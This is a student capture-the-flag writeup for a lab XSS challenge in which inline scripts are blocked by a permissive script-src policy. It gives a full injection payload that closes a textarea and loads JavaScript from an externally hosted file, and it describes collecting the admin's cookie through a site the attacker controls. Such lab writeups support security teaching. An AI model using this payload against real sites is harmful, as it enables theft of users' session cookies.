# Challenge `Read my lips: No more scripts!` writeup

- Vulnerability: XSS vulnerability but this time inline scripts are not allowed because of the Content Security Policy directive: script-src *
- Where: *Update post and send it to admin review* button
- Impact: We can inject code in the *Content* text area on the *Add a new blogpost for review* section that will be reflected in the web browser after clicking on the *Update post and send it to admin review* button. This time however the script must be in a file hosted for example in sigma. This script can include a link to a website you are controlling and by doing a request to it you can collect the cookies of who did the request there

## Steps to reproduce

1. This challenge is similar to the `Go on and censor my cookies` challenge but the script must be in a file.
2. Create a JavaScript file (read_my_lips_no_more_scripts.js) on sigma's directory `web/` like [this](https://gitlab.rnl.tecnico.ulisboa.pt/ssof2223/writeups/ist193342/-/blob/master/lab4/read_my_lips_no_more_scripts.js)
3. Use the same logic we used in the `Go on and censor my cookies` challenge closing the **textarea** tag and writing the code after. The final payload will be `</textarea><script src="http://web.tecnico.ulisboa.pt/ist193342/read_my_lips_no_more_scripts.js"></script><textarea>`
4. The rest of the steps are also the same as the `Go on and censor my cookies` challenge
5. Like in that challenge there is an admin's cookie called **SECRET** whose value is the flag
